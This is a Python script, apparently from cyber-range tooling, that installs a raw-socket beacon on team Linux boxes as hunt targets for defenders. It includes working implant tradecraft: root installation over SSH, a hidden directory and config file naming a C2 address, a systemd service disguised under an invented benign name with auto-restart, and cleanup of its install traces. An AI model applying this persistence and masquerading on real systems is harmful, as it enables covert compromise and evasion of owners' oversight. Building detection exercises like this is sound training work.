"""Plant raw-socket beacons on team Linux boxes as blue-team hunt artifacts (unscored, non-destructive)."""

import os
import subprocess
import time
from pathlib import Path

REPO = Path(__file__).resolve().parent
BEACON_SRC = REPO / "artifacts" / "rawsockets-beacon" / "beacon.c"
BUILD_DIR = REPO / "artifacts" / "rawsockets-beacon" / "build"

REMOTE_DIR = "/usr/local/lib/.sysmon"
REMOTE_BIN = f"{REMOTE_DIR}/beacon"
UNIT_NAME = "wda-digest.service"

BEACON_INTERVALS = {"web01": 45, "app01": 60, "db01": 90}
BEACON_PORT = 4444


def _is_windows(template_name):
    return "win" in template_name.lower()


def _build_beacon():
    """Static build for the operator host; failure here means on-box compilation."""
    BUILD_DIR.mkdir(parents=True, exist_ok=True)
    out = BUILD_DIR / "beacon"
    r = subprocess.run(
        ["gcc", "-O2", "-std=gnu99", "-static", "-o", str(out), str(BEACON_SRC)],
        capture_output=True, text=True)
    if r.returncode == 0 and out.exists():
        return out, "static"
    return None, f"static build failed: {(r.stderr or '')[-200:]}"


def _gateway_proxy(ctx):
    return (f"ssh -i {ctx['ssh_key_path']} -o StrictHostKeyChecking=no "
            f"-o UserKnownHostsFile=/dev/null -W %h:%p "
            f"{ctx['vm_username']}@{ctx['scoring_engine_ip']}")


def _scp_to_box(ctx, box_username, ip, src, dst):
    return subprocess.run(
        ["scp", "-i", ctx["ssh_key_path"],
         "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
         "-o", f"ProxyCommand={_gateway_proxy(ctx)}", str(src), f"{box_username}@{ip}:{dst}"],
        capture_output=True, text=True, timeout=120)


def _ssh_box(ctx, box_username, ip, cmd, timeout=90, sudo_password=None):
    """Run cmd on a team box via the gateway; with sudo_password it runs as root via sudo -S."""
    ssh_cmd = ["ssh", "-i", ctx["ssh_key_path"],
               "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
               "-o", "ConnectTimeout=10", "-o", f"ProxyCommand={_gateway_proxy(ctx)}",
               f"{box_username}@{ip}"]
    if sudo_password is not None:
        ssh_cmd.append("sudo -S -p '' bash -s")
        return subprocess.run(ssh_cmd, input=sudo_password + "\n" + cmd,
                              capture_output=True, text=True, timeout=timeout)
    return subprocess.run(ssh_cmd, input=cmd, capture_output=True, text=True, timeout=timeout)


def _unit(box_name, target_ip, interval):
    return (
        "[Unit]\n"
        "Description=Wardline Data Digest Agent\n"
        "After=network-online.target\n"
        "Wants=network-online.target\n\n"
        "[Service]\n"
        "Type=simple\n"
        f"ExecStart={REMOTE_BIN} -t {target_ip} -p {BEACON_PORT} -i {interval} -n 0 -b wardline-{box_name}\n"
        "Restart=always\n"
        "RestartSec=20\n\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n"
    )


def plant_team_beacons(teams, boxes, ctx, box_username="ubuntu", box_password=None):
    """Install beacons on every (team, linux box); warns and continues — never aborts a deploy."""
    from range_ops import enumerate_targets

    binary, how = _build_beacon()
    if binary is None:
        print(f"  beacons: local static build unavailable ({how}) — building on each box")
    else:
        print(f"  beacons: using local {how} binary")

    targets = [t for t in enumerate_targets(teams, boxes)
               if not _is_windows(t["box"]["template"]) and t["box_name"] in BEACON_INTERVALS]
    planted = 0
    for t in targets:
        ip, name = t["ip"], t["box_name"]
        gw = f"192.168.{t['identifier']}.1"
        interval = BEACON_INTERVALS[name]
        unit = _unit(name, gw, interval)
        try:
            if binary is not None:
                r = _scp_to_box(ctx, box_username, ip, binary, "/tmp/.wda-b")
                if r.returncode != 0:
                    raise RuntimeError(f"scp failed: {(r.stderr or '').strip()[-150:]}")
                build_step = f"install -m 755 /tmp/.wda-b {REMOTE_BIN}"
            else:
                r = _scp_to_box(ctx, box_username, ip, BEACON_SRC, "/tmp/.wda.c")
                if r.returncode != 0:
                    raise RuntimeError(f"scp failed: {(r.stderr or '').strip()[-150:]}")
                build_step = (
                    "command -v cc >/dev/null || command -v gcc >/dev/null || "
                    "(apt-get update -qq && apt-get install -y -qq gcc) ; "
                    "cc -O2 -std=gnu99 -o /tmp/.wda-b /tmp/.wda.c 2>/dev/null "
                    "|| gcc -O2 -std=gnu99 -o /tmp/.wda-b /tmp/.wda.c ; "
                    f"install -m 755 /tmp/.wda-b {REMOTE_BIN}"
                )
            install_script = (
                "set -e\n"
                f"mkdir -p {REMOTE_DIR}\n"
                f"{build_step}\n"
                f"printf 'C2={gw}:{BEACON_PORT}\\nagent=wardline-{name}\\n' | tee /etc/.sysmon.conf >/dev/null\n"
                "chmod 644 /etc/.sysmon.conf\n"
                "tee /etc/systemd/system/" + UNIT_NAME + " > /dev/null << 'UNITEOF'\n"
                + unit + "UNITEOF\n"
                "systemctl daemon-reload\n"
                f"systemctl enable --now {UNIT_NAME} >/dev/null 2>&1 || true\n"
                "sleep 1\n"
                f"systemctl is-active {UNIT_NAME} || true\n"
                "rm -f /tmp/.wda-b /tmp/.wda.c\n"
            )
            local_script = BUILD_DIR / "wda-install.sh"
            local_script.write_text(install_script)
            r = _scp_to_box(ctx, box_username, ip, local_script, "/tmp/.wda-install.sh")
            if r.returncode != 0:
                raise RuntimeError(f"scp failed: {(r.stderr or '').strip()[-150:]}")
            r = _ssh_box(ctx, box_username, ip, "sudo -S -p '' bash /tmp/.wda-install.sh",
                         timeout=300, sudo_password=box_password)
            _ssh_box(ctx, box_username, ip, "rm -f /tmp/.wda-install.sh", timeout=30)
            active = (r.stdout or "").strip().splitlines()[-1:] or ["?"]
            if active[0] == "active":
                planted += 1
                print(f"    beacon live on {name}-team{t['identifier']} ({ip}) every {interval}s -> {gw}:{BEACON_PORT}")
            else:
                raise RuntimeError(f"unit not active: {(r.stdout or r.stderr or '').strip()[-150:]}")
        except Exception as e:
            print(f"    WARNING: beacon on {ip} failed (continuing): {e}")
        time.sleep(1)
    print(f"  beacons planted on {planted}/{len(targets)} linux boxes")
